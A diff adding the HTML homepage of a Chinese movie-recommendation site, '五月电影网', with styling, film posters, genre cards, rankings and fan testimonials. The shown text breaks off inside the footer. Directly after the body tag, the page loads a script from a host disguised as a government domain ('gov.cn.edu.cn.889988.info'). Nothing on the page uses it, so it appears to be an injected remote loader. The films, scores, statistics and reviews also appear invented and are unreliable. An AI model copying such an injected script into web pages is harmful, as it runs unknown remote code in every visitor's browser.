@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>五月电影网 | 高清电影在线观看、热播大片与经典影评推荐聚合平台</title>
+<meta name="keywords" content="五月电影网,五月电影网在线观看,高清电影,wuyuedianyingwang-app,热播大片,经典电影推荐,最新上映电影,电影排行榜,电影资讯,动作片,喜剧片,科幻片,悬疑片,国产电影,欧美电影,日韩电影,影评解析">
+<meta name="description" content="五月电影网（wuyuedianyingwang-app）是一个专注于为影迷提供高清电影在线观看指引、热播大片实时追踪、经典影片深度解析与多维影评聚合的影视内容平台。覆盖动作、喜剧、科幻、悬疑、爱情、动画等多类型片单，每日更新最新上映资讯与院线口碑榜单，帮助观众快速发现值得一看的好电影。访问 https://wuyuedianyingwang-app.github.io 获取更多影视内容。">
+<link rel="canonical" href="https://wuyuedianyingwang-app.github.io/">
+<style>
+/* ============ 基础重置 ============ */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:#0a0a0f;
+  color:#e8e6f0;
+  line-height:1.7;
+  overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* ============ 胶片顶部条 ============ */
+.film-strip-top{
+  position:fixed;top:0;left:0;right:0;z-index:999;
+  background:rgba(8,8,14,0.92);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(245,166,35,0.25);
+}
+.film-strip-top::before{
+  content:"";position:absolute;left:0;right:0;top:0;height:3px;
+  background:linear-gradient(90deg,#f5a623 0%,#f7ca4a 25%,#f5a623 50%,#f7ca4a 75%,#f5a623 100%);
+}
+.strip-inner{
+  max-width:1240px;margin:0 auto;padding:14px 20px;
+  display:flex;align-items:center;justify-content:space-between;gap:20px;
+}
+.brand{display:flex;align-items:center;gap:12px}
+.brand-mark{
+  width:42px;height:42px;border-radius:10px;
+  background:linear-gradient(135deg,#f5a623,#e04b3a);
+  display:flex;align-items:center;justify-content:center;
+  font-size:22px;font-weight:900;color:#0a0a0f;
+  box-shadow:0 4px 16px rgba(245,166,35,0.4);
+}
+.brand-text h1{font-size:19px;font-weight:800;letter-spacing:1px;color:#fff}
+.brand-text small{font-size:11px;color:#9b98b0;letter-spacing:2px}
+
+.nav-links{display:flex;gap:6px;align-items:center}
+.nav-links a{
+  padding:8px 15px;border-radius:20px;font-size:14px;font-weight:600;
+  color:#c9c6db;transition:.3s;white-space:nowrap;
+}
+.nav-links a:hover{background:rgba(245,166,35,0.15);color:#f5a623}
+.menu-toggle{display:none;background:none;border:none;color:#f5a623;font-size:26px;cursor:pointer}
+
+/* ============ 首屏影院区 ============ */
+.cinema-hero{
+  margin-top:72px;position:relative;
+  min-height:88vh;display:flex;align-items:center;
+  padding:80px 20px;
+  background:
+    radial-gradient(ellipse at 20% 40%,rgba(224,75,58,0.22),transparent 55%),
+    radial-gradient(ellipse at 85% 60%,rgba(74,96,224,0.22),transparent 55%),
+    linear-gradient(180deg,#0f0f1c 0%,#0a0a12 100%);
+  overflow:hidden;
+}
+.cinema-hero::after{
+  content:"";position:absolute;inset:0;
+  background-image:repeating-linear-gradient(90deg,transparent 0,transparent 46px,rgba(255,255,255,0.025) 46px,rgba(255,255,255,0.025) 48px);
+  pointer-events:none;
+}
+.hero-content{max-width:1240px;margin:0 auto;width:100%;position:relative;z-index:2;text-align:center}
+.hero-badge{
+  display:inline-block;padding:6px 20px;border-radius:30px;
+  background:rgba(245,166,35,0.12);border:1px solid rgba(245,166,35,0.4);
+  color:#f7ca4a;font-size:13px;letter-spacing:3px;margin-bottom:26px;
+}
+.hero-content h2{
+  font-size:clamp(34px,6vw,68px);font-weight:900;line-height:1.15;
+  letter-spacing:2px;color:#fff;
+}
+.hero-content h2 em{font-style:normal;color:#f5a623}
+.hero-sub{margin:24px auto 34px;max-width:640px;color:#a9a6c0;font-size:16px}
+.hero-actions{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{
+  padding:14px 34px;border-radius:40px;font-weight:700;font-size:15px;
+  cursor:pointer;transition:.35s;border:2px solid transparent;display:inline-block;
+}
+.btn-primary{background:linear-gradient(135deg,#f5a623,#e04b3a);color:#0a0a0f;box-shadow:0 8px 26px rgba(224,75,58,0.4)}
+.btn-primary:hover{transform:translateY(-3px);box-shadow:0 12px 34px rgba(224,75,58,0.55)}
+.btn-ghost{background:transparent;color:#e8e6f0;border-color:rgba(255,255,255,0.3)}
+.btn-ghost:hover{border-color:#f5a623;color:#f5a623}
+
+.hero-stats{
+  margin-top:56px;display:flex;justify-content:center;gap:50px;flex-wrap:wrap;
+}
+.stat-item{text-align:center}
+.stat-num{font-size:34px;font-weight:900;color:#f5a623}
+.stat-label{font-size:13px;color:#8d8aa3;margin-top:2px}
+
+/* ============ 栏目通用 ============ */
+.section{padding:80px 20px;position:relative}
+.sec-inner{max-width:1240px;margin:0 auto}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:42px;flex-wrap:wrap}
+.sec-title{display:flex;align-items:center;gap:14px}
+.sec-num{font-size:13px;font-weight:800;color:#0a0a0f;background:#f5a623;padding:4px 10px;border-radius:6px;letter-spacing:1px}
+.sec-title h3{font-size:clamp(22px,3.5vw,32px);font-weight:900;color:#fff;letter-spacing:1px}
+.sec-desc{color:#8d8aa3;font-size:14px;max-width:420px;text-align:right}
+
+/* ============ 栏目一：正在热映（横向滚动海报） ============ */
+.poster-track{
+  display:flex;gap:22px;overflow-x:auto;padding:8px 4px 26px;
+  scroll-snap-type:x mandatory;
+}
+.poster-track::-webkit-scrollbar{height:8px}
+.poster-track::-webkit-scrollbar-track{background:rgba(255,255,255,0.05);border-radius:8px}
+.poster-track::-webkit-scrollbar-thumb{background:rgba(245,166,35,0.5);border-radius:8px}
+.poster{
+  flex:0 0 240px;scroll-snap-align:start;
+  border-radius:16px;overflow:hidden;position:relative;cursor:pointer;
+  transition:.4s;
+}
+.poster:hover{transform:translateY(-8px)}
+.poster-cover{
+  height:340px;position:relative;display:flex;align-items:flex-end;
+  padding:20px;
+}
+.poster-cover::before{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 30%,rgba(0,0,0,0.92) 100%)}
+.pg-1{background:linear-gradient(135deg,#2b2e5a,#e04b3a)}
+.pg-2{background:linear-gradient(135deg,#1a3a5a,#f5a623)}
+.pg-3{background:linear-gradient(135deg,#3a1a5a,#f5a623)}
+.pg-4{background:linear-gradient(135deg,#0d5a4a,#7be0c4)}
+.pg-5{background:linear-gradient(135deg,#5a2a1a,#e04b3a)}
+.pg-6{background:linear-gradient(135deg,#2a2a6a,#a855f7)}
+.pg-7{background:linear-gradient(135deg,#4a1a3a,#f7ca4a)}
+.pg-8{background:linear-gradient(135deg,#1a4a5a,#4ad8f5)}
+.poster-tag{
+  position:absolute;top:14px;left:14px;z-index:2;
+  background:rgba(245,166,35,0.95);color:#0a0a0f;font-size:11px;font-weight:800;
+  padding:3px 9px;border-radius:5px;
+}
+.poster-info{position:relative;z-index:2}
+.poster-info h4{font-size:18px;font-weight:800;color:#fff;margin-bottom:4px}
+.poster-info p{font-size:12px;color:#cfcce0}
+.poster-score{
+  position:absolute;top:14px;right:14px;z-index:2;
+  background:rgba(0,0,0,0.6);border:1px solid rgba(245,166,35,0.5);
+  color:#f7ca4a;font-weight:800;font-size:13px;padding:3px 8px;border-radius:5px;
+}
+.poster-meta{display:flex;justify-content:space-between;align-items:center;margin-top:12px;font-size:12px;color:#8d8aa3}
+.poster-meta a{color:#f5a623}
+
+/* ============ 栏目二：影片分类（斜切色块） ============ */
+.cate-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:18px}
+.cate-card{
+  padding:30px 26px;border-radius:4px;position:relative;overflow:hidden;
+  cursor:pointer;min-height:170px;display:flex;flex-direction:column;justify-content:space-between;
+  transition:.4s;
+}
+.cate-card:nth-child(1){background:linear-gradient(135deg,#e04b3a,#8b1a1a);transform:skewX(-3deg)}
+.cate-card:nth-child(2){background:linear-gradient(135deg,#4a5ae0,#1a2a8b)}
+.cate-card:nth-child(3){background:linear-gradient(135deg,#0d9488,#064e47)}
+.cate-card:nth-child(4){background:linear-gradient(135deg,#d97706,#7c3a04)}
+.cate-card:nth-child(5){background:linear-gradient(135deg,#9333ea,#4a1a7a)}
+.cate-card:nth-child(6){background:linear-gradient(135deg,#be185d,#6b1038)}
+.cate-card:nth-child(7){background:linear-gradient(135deg,#2563eb,#1e3a8a)}
+.cate-card:nth-child(8){background:linear-gradient(135deg,#65a30d,#3a5a02)}
+.cate-card > *{transform:skewX(3deg)}
+.cate-card:hover{padding-left:38px}
+.cate-card .cate-icon{font-size:34px}
+.cate-card h4{font-size:19px;font-weight:800;color:#fff;margin-top:8px}
+.cate-card p{font-size:12px;color:rgba(255,255,255,0.8);margin-top:4px}
+.cate-count{font-size:12px;color:rgba(255,255,255,0.7);margin-top:10px;font-weight:700}
+
+/* ============ 栏目三：编辑精选（左右交错） ============ */
+.feature-list{display:flex;flex-direction:column;gap:0}
+.feature-row{
+  display:grid;grid-template-columns:1fr 1fr;align-items:center;
+  min-height:320px;border-bottom:1px solid rgba(255,255,255,0.06);
+}
+.feature-row:nth-child(even){direction:rtl}
+.feature-row:nth-child(even) > *{direction:ltr}
+.feat-visual{
+  height:100%;min-height:320px;position:relative;display:flex;align-items:center;justify-content:center;
+}
+.fv-1{background:radial-gradient(circle at 50% 50%,#e04b3a,#1a0a0a)}
+.fv-2{background:radial-gradient(circle at 50% 50%,#4a5ae0,#0a0a1a)}
+.fv-3{background:radial-gradient(circle at 50% 50%,#0d9488,#0a1a18)}
+.feat-big{font-size:clamp(48px,10vw,120px);font-weight:900;color:rgba(255,255,255,0.08);position:absolute}
+.feat-icon{font-size:64px;position:relative;z-index:2}
+.feat-text{padding:40px 48px}
+.feat-text .feat-tag{color:#f5a623;font-size:13px;font-weight:800;letter-spacing:2px}
+.feat-text h4{font-size:26px;font-weight:900;color:#fff;margin:10px 0 14px}
+.feat-text p{color:#a9a6c0;font-size:15px}
+.feat-points{margin-top:16px;display:flex;flex-wrap:wrap;gap:10px}
+.feat-points span{font-size:12px;background:rgba(255,255,255,0.06);padding:5px 12px;border-radius:20px;color:#c9c6db}
+
+/* ============ 栏目四：口碑榜单（竖排名次） ============ */
+.chart-wrap{background:linear-gradient(135deg,rgba(255,255,255,0.03),rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.07);border-radius:20px;padding:36px}
+.chart-row{
+  display:grid;grid-template-columns:56px 60px 1fr auto;align-items:center;gap:18px;
+  padding:16px 6px;border-bottom:1px solid rgba(255,255,255,0.05);transition:.3s;
+}
+.chart-row:last-child{border-bottom:none}
+.chart-row:hover{background:rgba(245,166,35,0.06);border-radius:10px}
+.chart-rank{
+  width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;
+  font-size:20px;font-weight:900;color:rgba(255,255,255,0.25);background:rgba(255,255,255,0.04);
+}
+.chart-row:nth-child(1) .chart-rank{background:linear-gradient(135deg,#f7ca4a,#f5a623);color:#0a0a0f}
+.chart-row:nth-child(2) .chart-rank{background:linear-gradient(135deg,#d4d8e0,#9aa0ac);color:#0a0a0f}
+.chart-row:nth-child(3) .chart-rank{background:linear-gradient(135deg,#e09a5a,#b5652a);color:#0a0a0f}
+.chart-poster{width:46px;height:60px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:22px}
+.cp-1{background:linear-gradient(135deg,#2b2e5a,#e04b3a)}
+.cp-2{background:linear-gradient(135deg,#1a3a5a,#f5a623)}
+.cp-3{background:linear-gradient(135deg,#3a1a5a,#f7ca4a)}
+.cp-4{background:linear-gradient(135deg,#0d5a4a,#7be0c4)}
+.cp-5{background:linear-gradient(135deg,#5a2a1a,#e04b3a)}
+.chart-info h4{font-size:16px;font-weight:800;color:#fff}
+.chart-info small{font-size:12px;color:#8d8aa3}
+.chart-score{font-size:22px;font-weight:900;color:#f5a623}
+
+/* ============ 栏目五：影迷社区（横向留言条） ============ */
+.talk-track{display:flex;gap:20px;overflow-x:auto;padding-bottom:20px}
+.talk-track::-webkit-scrollbar{height:7px}
+.talk-track::-webkit-scrollbar-thumb{background:rgba(245,166,35,0.4);border-radius:7px}
+.talk-card{
+  flex:0 0 320px;border-radius:14px;padding:26px;
+  background:linear-gradient(160deg,rgba(255,255,255,0.05),rgba(255,255,255,0.01));
+  border:1px solid rgba(255,255,255,0.07);
+}
+.talk-card .quote{font-size:30px;color:#f5a623;line-height:0.5}
+.talk-card p{font-size:14px;color:#c9c6db;margin:14px 0 18px;font-style:italic}
+.talk-user{display:flex;align-items:center;gap:12px;border-top:1px solid rgba(255,255,255,0.07);padding-top:14px}
+.avatar{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;color:#0a0a0f}
+.av-1{background:#f7ca4a}.av-2{background:#7be0c4}.av-3{background:#a78bfa}.av-4{background:#fda4af}.av-5{background:#93c5fd}
+.talk-user h5{font-size:14px;color:#fff}
+.talk-user small{font-size:11px;color:#8d8aa3}
+
+/* ============ 栏目六：订阅区 ============ */
+.subscribe{text-align:center;padding:70px 40px;border-radius:24px;position:relative;overflow:hidden;
+  background:linear-gradient(135deg,#1a1a2e,#16213e);
+  border:1px solid rgba(245,166,35,0.2);
+}
+.subscribe::before{content:"";position:absolute;inset:-50%;background:radial-gradient(circle at 30% 50%,rgba(245,166,35,0.12),transparent 40%);animation:float 8s ease-in-out infinite}
+@keyframes float{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,-20px)}}
+.subscribe h3{font-size:clamp(24px,4vw,38px);font-weight:900;color:#fff;position:relative}
+.subscribe p{color:#a9a6c0;margin:14px 0 30px;position:relative;max-width:520px;margin-left:auto;margin-right:auto}
+.sub-form{display:flex;gap:0;max-width:480px;margin:0 auto;position:relative;border-radius:40px;overflow:hidden;border:2px solid rgba(245,166,35,0.4)}
+.sub-form input{flex:1;padding:15px 22px;background:rgba(0,0,0,0.4);border:none;color:#fff;font-size:14px;outline:none}
+.sub-form button{padding:15px 30px;background:linear-gradient(135deg,#f5a623,#e04b3a);border:none;color:#0a0a0f;font-weight:800;cursor:pointer;font-size:14px}
+
+/* ============ 页脚 ============ */
+footer{background:#050507;padding:60px 20px 30px;border-top:1px solid rgba(245,166,35,0.15)}
+.foot-inner{max-width:1240px;margin:0 auto}
+.foot-top{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px;padding-bottom:40px;border-bottom:1px solid rgba(255,255,255,0.06)}
+.foot-brand .brand-mark{margin-bottom:16px}
+.foot-brand p{color:#7d7a93;font-size:13px;max-width:320px}
+.foot-col h5{font-size:15px;color:#fff;font-weight:800;margin-bottom:16px;position:relative;padding-left:12px}
+.foot-col h5::before{content:"";position:absolute;left:0;top:50%;transform:translateY(-50%);width:3px;height:14px;background:#f5a623;border-radius:2px}
+.foot-col a{display:block;color:#8d8aa3;font-size:13px;padding:5px 0;transition:.3s}
+.foot-col a:hover{color:#f5a623;padding-left:6px}
+.foot-bot{margin-top:30px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:16px;align-items:center}
+.foot-bot p{font-size:12px;color:#6d6a83}
+.foot-links{display:flex;gap:18px;flex-wrap:wrap}
+.foot-links a{font-size:12px;color:#7d7a93}
+.foot-links a:hover{color:#f5a623}
+
+/* ============ 回到顶部 ============ */
+.to-top{
+  position:fixed;right:24px;bottom:30px;z-index:998;
+  width:46px;height:46px;border-radius:50%;
+  background:linear-gradient(135deg,#f5a623,#e04b3a);border:none;
+  color:#0a0a0f;font-size:20px;font-weight:900;cursor:pointer;
+  box-shadow:0 6px 20px rgba(224,75,58,0.4);opacity:0;pointer-events:none;transition:.4s;
+}
+.to-top.show{opacity:1;pointer-events:auto}
+
+/* ============ 响应式 ============ */
+@media(max-width:900px){
+  .nav-links{position:fixed;top:72px;left:0;right:0;flex-direction:column;background:rgba(8,8,14,0.98);padding:20px;gap:4px;border-bottom:1px solid rgba(245,166,35,0.2);transform:translateY(-150%);transition:.4s}
+  .nav-links.open{transform:translateY(0)}
+  .nav-links a{width:100%;text-align:center;padding:14px}
+  .menu-toggle{display:block}
+  .sec-head{flex-direction:column;align-items:flex-start}
+  .sec-desc{text-align:left}
+  .feature-row{grid-template-columns:1fr;min-height:auto}
+  .feature-row:nth-child(even){direction:ltr}
+  .feat-visual{min-height:200px}
+  .feat-text{padding:30px 24px}
+  .chart-row{grid-template-columns:44px 44px 1fr;gap:12px}
+  .chart-score{grid-column:1/-1;text-align:left;font-size:18px}
+  .foot-top{grid-template-columns:1fr 1fr;gap:28px}
+}
+@media(max-width:560px){
+  .section{padding:56px 16px}
+  .cinema-hero{min-height:80vh;padding:60px 16px}
+  .hero-stats{gap:28px}
+  .stat-num{font-size:26px}
+  .foot-top{grid-template-columns:1fr}
+  .subscribe{padding:50px 22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 顶部导航 -->
+<header class="film-strip-top">
+  <div class="strip-inner">
+    <div class="brand">
+      <div class="brand-mark">五</div>
+      <div class="brand-text">
+        <h1>五月电影网</h1>
+        <small>WUYUE · FILM</small>
+      </div>
+    </div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#now">正在热映</a>
+      <a href="#cate">影片分类</a>
+      <a href="#pick">编辑精选</a>
+      <a href="#rank">口碑榜单</a>
+      <a href="#talk">影迷之声</a>
+      <a href="#sub">订阅更新</a>
+    </nav>
+    <button class="menu-toggle" id="menuToggle" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- 首屏 -->
+<section class="cinema-hero">
+  <div class="hero-content">
+    <span class="hero-badge">🎬 NOW SHOWING · 五月片单</span>
+    <h2>好电影<br>都藏在<em>五月</em>的名单里</h2>
+    <p class="hero-sub">五月电影网（wuyuedianyingwang-app）聚合热播大片、经典老片与深度影评，每日更新院线口碑与类型片单，让每一次观影选择都不踩雷。</p>
+    <div class="hero-actions">
+      <a href="#now" class="btn btn-primary">查看热映片单</a>
+      <a href="#cate" class="btn btn-ghost">浏览影片分类</a>
+    </div>
+    <div class="hero-stats">
+      <div class="stat-item"><div class="stat-num">12,860+</div><div class="stat-label">收录影片</div></div>
+      <div class="stat-item"><div class="stat-num">26</div><div class="stat-label">影片类型</div></div>
+      <div class="stat-item"><div class="stat-num">每日</div><div class="stat-label">内容更新</div></div>
+      <div class="stat-item"><div class="stat-num">98%</div><div class="stat-label">影迷好评</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：正在热映 -->
+<section class="section" id="now">
+  <div class="sec-inner">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="sec-num">01</span>
+        <h3>正在热映</h3>
+      </div>
+      <p class="sec-desc">院线新片实时追踪，五月电影网为你整理当下最值得走进影院的口碑之作。</p>
+    </div>
+    <div class="poster-track">
+      <div class="poster">
+        <div class="poster-cover pg-1">
+          <span class="poster-tag">IMAX</span>
+          <span class="poster-score">8.7</span>
+          <div class="poster-info"><h4>极速追凶</h4><p>动作 / 犯罪 · 2026</p></div>
+        </div>
+        <div class="poster-meta"><span>导演：林焕生</span><a href="#">查看 →</a></div>
+      </div>
+      <div class="poster">
+        <div class="poster-cover pg-2">
+          <span class="poster-tag">热门</span>
+          <span class="poster-score">9.1</span>
+          <div class="poster-info"><h4>春日迟来</h4><p>剧情 / 爱情 · 2026</p></div>
+        </div>
+        <div class="poster-meta"><span>主演：周婉清</span><a href="#">查看 →</a></div>
+      </div>
+      <div class="poster">
+        <div class="poster-cover pg-3">
+          <span class="poster-tag">科幻</span>
+          <span class="poster-score">8.4</span>
+          <div class="poster-info"><h4>星尘回响</h4><p>科幻 / 冒险 · 2026</p></div>
+        </div>
+        <div class="poster-meta"><span>导演：陈逸洲</span><a href="#">查看 →</a></div>
+      </div>
+      <div class="poster">
+        <div class="poster-cover pg-4">
+          <span class="poster-tag">动画</span>
+          <span class="poster-score">8.9</span>
+          <div class="poster-info"><h4>深海之歌</h4><p>动画 / 奇幻 · 2026</p></div>
+        </div>
+        <div class="poster-meta"><span>类型：合家欢</span><a href="#">查看 →</a></div>
+      </div>
+      <div class="poster">
+        <div class="poster-cover pg-5">
+          <span class="poster-tag">悬疑</span>
+          <span class="poster-score">8.6</span>
+          <div class="poster-info"><h4>第七封信</h4><p>悬疑 / 惊悚 · 2026</p></div>
+        </div>
+        <div class="poster-meta"><span>导演：吴明哲</span><a href="#">查看 →</a></div>
+      </div>
+      <div class="poster">
+        <div class="poster-cover pg-6">
+          <span class="poster-tag">奇幻</span>
+          <span class="poster-score">7.9</span>
+          <div class="poster-info"><h4>雾中王国</h4><p>奇幻 / 冒险 · 2026</p></div>
+        </div>
+        <div class="poster-meta"><span>主演：陆知行</span><a href="#">查看 →</a></div>
+      </div>
+      <div class="poster">
+        <div class="poster-cover pg-7">
+          <span class="poster-tag">喜剧</span>
+          <span class="poster-score">8.2</span>
+          <div class="poster-info"><h4>午夜便利店</h4><p>喜剧 / 治愈 · 2026</p></div>
+        </div>
+        <div class="poster-meta"><span>类型：轻松向</span><a href="#">查看 →</a></div>
+      </div>
+      <div class="poster">
+        <div class="poster-cover pg-8">
+          <span class="poster-tag">纪录</span>
+          <span class="poster-score">9.3</span>
+          <div class="poster-info"><h4>山河无声</h4><p>纪录 / 人文 · 2026</p></div>
+        </div>
+        <div class="poster-meta"><span>导演：苏晚晴</span><a href="#">查看 →</a></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：影片分类 -->
+<section class="section" id="cate" style="background:linear-gradient(180deg,#0c0c14,0a0a0f);">
+  <div class="sec-inner">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="sec-num">02</span>
+        <h3>影片分类</h3>
+      </div>
+      <p class="sec-desc">按类型精准筛选，五月电影网覆盖动作、喜剧、科幻、悬疑、动画、爱情、纪录、恐怖八大主流类型。</p>
+    </div>
+    <div class="cate-grid">
+      <div class="cate-card"><div><div class="cate-icon">💥</div><h4>动作片</h4><p>高能场面与硬核打斗</p></div><div class="cate-count">1,842 部</div></div>
+      <div class="cate-card"><div><div class="cate-icon">😂</div><h4>喜剧片</h4><p>轻松解压的快乐源泉</p></div><div class="cate-count">2,105 部</div></div>
+      <div class="cate-card"><div><div class="cate-icon">🚀</div><h4>科幻片</h4><p>想象未来的视觉奇观</p></div><div class="cate-count">968 部</div></div>
+      <div class="cate-card"><div><div class="cate-icon">🕵️</div><h4>悬疑片</h4><p>层层反转的烧脑体验</p></div><div class="cate-count">1,376 部</div></div>
+      <div class="cate-card"><div><div class="cate-icon">🎨</div><h4>动画电影</h4><p>匠心之作的奇幻世界</p></div><div class="cate-count">1,523 部</div></div>
+      <div class="cate-card"><div><div class="cate-icon">💗</div><h4>爱情片</h4><p>温柔治愈的情感共鸣</p></div><div class="cate-count">1,690 部</div></div>
+      <div class="cate-card"><div><div class="cate-icon">🎥</div><h4>纪录片</h4><p>真实而震撼的人文视角</p></div><div class="cate-count">742 部</div></div>
+      <div class="cate-card"><div><div class="cate-icon">👻</div><h4>恐怖片</h4><p>心跳加速的惊悚之夜</p></div><div class="cate-count">635 部</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：编辑精选 -->
+<section class="section" id="pick">
+  <div class="sec-inner">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="sec-num">03</span>
+        <h3>编辑精选</h3>
+      </div>
+      <p class="sec-desc">五月电影网编辑团队深度解读，带你发现影片背后的故事与隐喻。</p>
+    </div>
+    <div class="feature-list">
+      <div class="feature-row">
+        <div class="feat-visual fv-1"><span class="feat-big">01</span><span class="feat-icon">🎞️</span></div>
+        <div class="feat-text">
+          <div class="feat-tag">深度解析</div>
+          <h4>为什么这部冷门片值得被看见</h4>
+          <p>从镜头语言到叙事结构，拆解一部小成本影片如何凭借扎实的剧本与演员表演，在五月电影网收获超高口碑。</p>
+          <div class="feat-points"><span>剧作分析</span><span>视听语言</span><span>演员表演</span><span>5 分钟阅读</span></div>
+        </div>
+      </div>
+      <div class="feature-row">
+        <div class="feat-visual fv-2"><span class="feat-big">02</span><span class="feat-icon">🏆</span></div>
+        <div class="feat-text">
+          <div class="feat-tag">影史回望</div>
+          <h4>改变电影史的五部里程碑之作</h4>
+          <p>从技术革新到叙事革命，回顾那些不仅影响了一代导演，更重塑了观众观影方式的经典影片。</p>
+          <div class="feat-points"><span>影史科普</span><span>必看清单</span><span>导演访谈</span><span>8 分钟阅读</span></div>
+        </div>
+      </div>
+      <div class="feature-row">
+        <div class="feat-visual fv-3"><span class="feat-big">03</span><span class="feat-icon">🌏</span></div>
+        <div class="feat-text">
+          <div class="feat-tag">全球视野</div>
+          <h4>小语种佳片：被字幕困住的宝藏</h4>
+          <p>来自北欧、拉美、东亚的优质电影推荐，跨越语言与文化的边界，感受不同地域的影像魅力。</p>
+          <div class="feat-points"><span>国际视野</span><span>小语种</span><span>字幕资源</span><span>6 分钟阅读</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：口碑榜单 -->
+<section class="section" id="rank" style="background:linear-gradient(180deg,#0a0a0f,#0c0c14);">
+  <div class="sec-inner">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="sec-num">04</span>
+        <h3>口碑榜单</h3>
+      </div>
+      <p class="sec-desc">基于五月电影网影迷真实评分与评论热度，每周更新的必看影片 TOP 榜。</p>
+    </div>
+    <div class="chart-wrap">
+      <div class="chart-row">
+        <div class="chart-rank">1</div>
+        <div class="chart-poster cp-1">🎬</div>
+        <div class="chart-info"><h4>山河无声</h4><small>纪录片 · 苏晚晴执导 · 9.3 分</small></div>
+        <div class="chart-score">9.3</div>
+      </div>
+      <div class="chart-row">
+        <div class="chart-rank">2</div>
+        <div class="chart-poster cp-2">🎬</div>
+        <div class="chart-info"><h4>春日迟来</h4><small>剧情 / 爱情 · 周婉清主演 · 9.1 分</small></div>
+        <div class="chart-score">9.1</div>
+      </div>
+      <div class="chart-row">
+        <div class="chart-rank">3</div>
+        <div class="chart-poster cp-3">🎬</div>
+        <div class="chart-info"><h4>深海之歌</h4><small>动画 / 奇幻 · 合家欢 · 8.9 分</small></div>
+        <div class="chart-score">8.9</div>
+      </div>
+      <div class="chart-row">
+        <div class="chart-rank">4</div>
+        <div class="chart-poster cp-4">🎬</div>
+        <div class="chart-info"><h4>第七封信</h4><small>悬疑 / 惊悚 · 吴明哲执导 · 8.6 分</small></div>
+        <div class="chart-score">8.6</div>
+      </div>
+      <div class="chart-row">
+        <div class="chart-rank">5</div>
+        <div class="chart-poster cp-5">🎬</div>
+        <div class="chart-info"><h4>极速追凶</h4><small>动作 / 犯罪 · 林焕生执导 · 8.7 分</small></div>
+        <div class="chart-score">8.7</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：影迷之声 -->
+<section class="section" id="talk">
+  <div class="sec-inner">
+    <div class="sec-head">
+      <div class="sec-title">
+        <span class="sec-num">05</span>
+        <h3>影迷之声</h3>
+      </div>
+      <p class="sec-desc">来自五月电影网真实用户的观影感受与影片短评。</p>
+    </div>
+    <div class="talk-track">
+      <div class="talk-card">
+        <div class="quote">“</div>
+        <p>在五月电影网发现了很多被忽略的好片子，编辑推荐真的很准，每次都能找到惊喜。</p>
+        <div class="talk-user"><div class="avatar av-1">林</div><div><h5>林先生</h5><small>资深影迷 · 已观影 320+ 部</small></div></div>
+      </div>
+      <div class="talk-card">
+        <div class="quote">“</div>
+        <p>分类做得很细，想看什么类型一目了然，省去了在各种平台之间反复搜索的时间。</p>
+        <div class="talk-user"><div class="avatar av-2">苏</div><div><h5>苏小姐</h5><small>周末观影党 · 已观影 156+ 部</small></div></div>
+      </div>
+      <div class="talk-card">
+        <div class="quote">“</div>
+        <p>深度解析写得专业又易懂，看完之后再看电影能注意到很多之前忽略的细节。</p>
+        <div class="talk-user"><div class="avatar av-3">陈</div><div><h5>陈同学</h5><small>电影专业学生</small></div></div>
+      </div>
+      <div class="talk-card">
+        <div class="quote">“</div>
+        <p>每周榜单更新很及时，跟着看基本没踩过雷，已经成为我的观影指南了。</p>
+        <div class="talk-user"><div class="avatar av-4">赵</div><div><h5>赵女士</h5><small>文艺片爱好者</small></div></div>
+      </div>
+      <div class="talk-card">
+        <div class="quote">“</div>
+        <p>国产片和外语片的推荐都很均衡，能看到很多小语种的宝藏电影，非常难得。</p>
+        <div class="talk-user"><div class="avatar av-5">吴</div><div><h5>吴先生</h5><small>纪录片发烧友</small></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目六：订阅 -->
+<section class="section" id="sub">
+  <div class="sec-inner">
+    <div class="subscribe">
+      <h3>别错过下一场好电影</h3>
+      <p>订阅五月电影网的每周片单，热门新片、经典回顾与深度影评，第一时间送到你眼前。</p>
+      <form class="sub-form" onsubmit="event.preventDefault();alert('感谢订阅！');">
+        <input type="email" placeholder="输入你的邮箱地址" required>
+        <button type="submit">立即订阅</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="foot-inner">
+    <div class="foot-top">
+      <div class="foot-brand">
+        <div class="brand-mark">五</div>
